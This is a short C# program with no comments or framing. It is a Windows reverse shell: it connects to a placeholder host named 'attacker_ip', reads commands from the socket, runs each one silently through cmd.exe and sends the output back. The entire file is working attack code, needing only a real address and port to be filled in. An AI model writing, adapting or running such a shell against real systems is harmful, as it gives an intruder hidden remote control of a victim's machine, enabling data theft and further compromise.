using System;
using System.Net.Sockets;
using System.IO;

class Program {
    static void Main() {
        using (TcpClient client = new TcpClient("attacker_ip", attacker_port)) {
            using (Stream stream = client.GetStream()) {
                StreamReader reader = new StreamReader(stream);
                StreamWriter writer = new StreamWriter(stream) { AutoFlush = true };
                string command;
                while ((command = reader.ReadLine()) != null) {
                    System.Diagnostics.Process proc = new System.Diagnostics.Process {
                        StartInfo = new System.Diagnostics.ProcessStartInfo {
                            FileName = "cmd.exe",
                            Arguments = "/c " + command,
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                            CreateNoWindow = true
                        }
                    };
                    proc.Start();
                    writer.WriteLine(proc.StandardOutput.ReadToEnd());
                    proc.WaitForExit();
                }
            }
        }
    }
}